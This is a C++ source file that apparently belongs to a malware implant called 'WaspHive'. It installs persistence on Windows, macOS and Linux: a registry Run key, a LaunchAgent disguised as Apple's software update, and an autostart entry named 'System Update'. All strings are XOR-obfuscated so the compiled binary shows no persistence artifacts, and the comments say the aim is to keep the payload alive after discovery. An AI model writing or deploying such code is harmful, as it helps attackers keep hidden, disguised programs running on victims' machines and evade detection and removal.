// ============================================================================
// persistence.cpp — Cross-platform Layered Persistence Implementation
// ============================================================================
// Defense-in-depth: Multiple independent mechanisms on each platform.
// If one is discovered and removed, others keep the payload alive.
//
// NOTE: All sensitive strings (Registry paths, file paths, labels) are
// wrapped in OBF() for compile-time XOR obfuscation. No plaintext
// persistence strings appear in the compiled binary.
// ============================================================================
#include "persistence.h"
#include "obfuscation.h"
#include "api_table.h"

#include <string>
#include <fstream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <iostream>

// POSIX headers needed cross-platform
#ifndef _WIN32
#include <unistd.h>
#endif

#ifdef __APPLE__
#include <mach-o/dyld.h>
#endif

using std::string;
using std::ofstream;
using std::ifstream;
using std::cout;
using std::endl;

// ============================================================================
// HELPER: Get current executable path (cross-platform)
// ============================================================================
#if !defined(_WIN32)
static string getExecutablePath() {
#ifdef __APPLE__
    char buf[1024] = {0};
    uint32_t size = sizeof(buf);
    if (_NSGetExecutablePath(buf, &size) == 0) {
        return string(buf);
    }
    return "";
#else
    // Linux
    char buf[1024] = {0};
    ssize_t len = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
    if (len != -1) {
        buf[len] = '\0';
        return string(buf);
    }
    return "";
#endif
}
#endif // !_WIN32

// ============================================================================
// MASTER INSTALLER — installPersistence()
// ============================================================================
// Calls ALL platform-appropriate persistence mechanisms.
// Returns true if AT LEAST ONE mechanism was installed successfully.
// Uses OBF() for ALL sensitive strings — no persistence artifacts in binary.
// ============================================================================
bool installPersistence() {
    int successes = 0;

#ifdef _WIN32
    // [1] Registry Run key (HKCU — no admin required)
    HKEY hKey;
    if (g_api.RegOpenKeyExA(HKEY_CURRENT_USER,
            OBF("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        char myPath[MAX_PATH];
        g_api.GetModuleFileNameA(NULL, myPath, MAX_PATH);
        if (g_api.RegSetValueExA(hKey, OBF("WaspHiveUpdater"), 0, REG_SZ,
                          (BYTE*)myPath, strlen(myPath) + 1) == ERROR_SUCCESS) {
            g_api.RegCloseKey(hKey);
            successes++;
            cout << OBF("[PERSISTENCE] [+] Registry Run key installed") << endl;
            return true;  // Early return on success
        }
        g_api.RegCloseKey(hKey);
    }
    cout << OBF("[PERSISTENCE] [-] Failed to install Registry persistence") << endl;

#elif __APPLE__
    // [1] LaunchAgent plist (RunAtLoad + KeepAlive — primary launchd respawn)
    const char* home = getenv("HOME");
    if (!home) {
        cout << OBF("[PERSISTENCE] [-] HOME not set") << endl;
        return false;
    }

    string launchAgentsDir = string(home) + OBF("/Library/LaunchAgents");
    string plistPath = launchAgentsDir + OBF("/com.apple.softwareupdate.plist");

    char myPath[1024];
    uint32_t pathSize = sizeof(myPath);
    if (_NSGetExecutablePath(myPath, &pathSize) != 0) {
        cout << OBF("[PERSISTENCE] [-] Failed to get executable path") << endl;
        return false;
    }

    // Create LaunchAgents directory if needed
    string mkdirCmd = OBF("mkdir -p ") + launchAgentsDir;
    system(mkdirCmd.c_str());

    // Write plist file
    ofstream plist(plistPath.c_str());
    if (!plist.is_open()) {
        cout << OBF("[PERSISTENCE] [-] Failed to write plist") << endl;
        return false;
    }
    plist << "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
          << "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
          << "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
          << "<plist version=\"1.0\">\n"
          << "<dict>\n"
          << "    <key>Label</key>\n"
          << "    <string>com.apple.softwareupdate</string>\n"
          << "    <key>ProgramArguments</key>\n"
          << "    <array>\n"
          << "        <string>" << myPath << "</string>\n"
          << "    </array>\n"
          << "    <key>RunAtLoad</key>\n"
          << "    <true/>\n"
          << "    <key>KeepAlive</key>\n"
          << "    <true/>\n"
          << "    <key>ProcessType</key>\n"
          << "    <string>Background</string>\n"
          << "</dict>\n"
          << "</plist>\n";
    plist.close();

    // Load the plist via launchctl
    string loadCmd = OBF("launchctl load ") + plistPath + OBF(" 2>/dev/null");
    int loadResult = system(loadCmd.c_str());

    if (loadResult == 0) {
        successes++;
        cout << OBF("[PERSISTENCE] [+] LaunchAgent installed") << endl;
        return true;  // Early return on success
    } else {
        cout << OBF("[PERSISTENCE] [!] Plist written but launchctl load returned: ") << loadResult << endl;
        cout << OBF("[PERSISTENCE] [!] Will load on next login") << endl;
        successes++;
        return true;  // Plist exists, will execute at next login regardless
    }

#else
    // === Linux ===
    const char* home_lnx = getenv("HOME");
    if (!home_lnx) {
        cout << OBF("[PERSISTENCE] [-] HOME not set") << endl;
        return false;
    }

    // [1] XDG autostart .desktop file (primary)
    string autostartDir = string(home_lnx) + OBF("/.config/autostart");
    string desktopPath = autostartDir + OBF("/system-update.desktop");

    char myPath[1024];
    ssize_t len = readlink("/proc/self/exe", myPath, sizeof(myPath) - 1);
    if (len == -1) {
        cout << OBF("[PERSISTENCE] [-] Failed to get executable path") << endl;
        return false;
    }
    myPath[len] = '\0';

    // Create autostart dir
    string mkdirCmd = OBF("mkdir -p ") + autostartDir;
    system(mkdirCmd.c_str());

    // Write .desktop file
    ofstream desktop(desktopPath.c_str());
    if (!desktop.is_open()) {
        cout << OBF("[PERSISTENCE] [-] Failed to write .desktop file") << endl;
        return false;
    }
    desktop << "[Desktop Entry]\n"
            << "Type=Application\n"
            << "Name=System Update\n"
            << "Exec=" << myPath << "\n"
            << "X-GNOME-Autostart-enabled=true\n"
            << "X-KDE-autostart-after=panel\n";
    desktop.close();

    successes++;
    cout << OBF("[PERSISTENCE] [+] Autostart installed") << endl;
    return true;
#endif

    return (successes > 0);  // Fallback: success if ANY mechanism installed
}

// ============================================================================
// UNINSTALL — removeAllPersistence()
// ============================================================================
// Removes ALL persistence mechanisms on the current platform.
// Returns count of mechanisms successfully removed.
// ============================================================================
int uninstallAllPersistence() {
    int removed = 0;

#ifdef _WIN32
    HKEY hKey;
    if (g_api.RegOpenKeyExA(HKEY_CURRENT_USER,
            OBF("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
            0, KEY_SET_VALUE | KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
        if (g_api.RegDeleteKeyExA(hKey, OBF("WaspHiveUpdater"), 0, 0) == ERROR_SUCCESS) {
            removed++;
        }
        g_api.RegCloseKey(hKey);
    }

#elif __APPLE__
    // [1] Remove LaunchAgent
    const char* home = getenv("HOME");
    if (home) {
        string plistPath = string(home) + OBF("/Library/LaunchAgents/com.apple.softwareupdate.plist");
        string unloadCmd = OBF("launchctl unload ") + plistPath + OBF(" 2>/dev/null");
        system(unloadCmd.c_str());
        if (remove(plistPath.c_str()) == 0) removed++;
    }

#else
    // Linux
    const char* home_lnx = getenv("HOME");
    if (home_lnx) {
        // [1] Remove .desktop autostart
        string desktopPath = string(home_lnx) + OBF("/.config/autostart/system-update.desktop");
        if (remove(desktopPath.c_str()) == 0) removed++;
    }

#endif

    return removed;
}
